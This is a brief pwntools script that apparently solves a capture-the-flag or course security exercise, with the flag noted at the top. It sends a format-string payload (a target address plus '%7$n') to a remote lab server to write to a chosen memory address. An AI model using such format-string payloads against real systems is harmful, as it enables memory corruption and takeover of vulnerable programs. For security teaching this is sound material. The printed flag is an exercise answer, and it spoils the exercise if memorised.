#SSof{Write_where_I_want}
from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 22192

### run a remote process
s = remote(SERVER, PORT, timeout=9999)
# s = process('./check', shell=True)


### interact with it
# using nm: target addr: 0804a040
target = b"\x40\xa0\x04\x08"

msg = target+b"%7$n."
print(msg)
# s.send(msg + b'\n')
s.sendline(msg)

print(s.recv())
# s.recvall()
# s.interactive()

